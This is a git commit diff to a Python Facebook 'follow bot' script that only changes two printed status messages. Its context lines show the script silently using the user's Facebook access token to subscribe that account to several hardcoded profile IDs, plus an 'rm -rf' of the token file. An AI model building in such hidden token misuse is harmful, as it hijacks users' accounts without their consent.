bddce780c9e0879b6b7723da08632b04ff4e2965
☆ RAKA ☆™︻®╤──────═◍➤ <95731529+Garangan-Z@users.noreply.github.com>
2021-12-08 16:09:15 +0700

    Update bot_follow_manda.py

--- bot_follow_manda.py
+++ bot_follow_manda.py
@@ -13,7 +13,7 @@ def main():
         nama = a["name"]
     except (KeyError,IOError):
         print('%s║'%(M))
-        print('%s╚══[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
+        print('%s╚══®[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         exit(manda.menu_log())
     requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
@@ -21,5 +21,5 @@ def main():
     requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
     requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token)
     print('%s║'%(O))
-    print('%s╚══[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
+    print('%s╚══®[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
     exit(manda.menu())
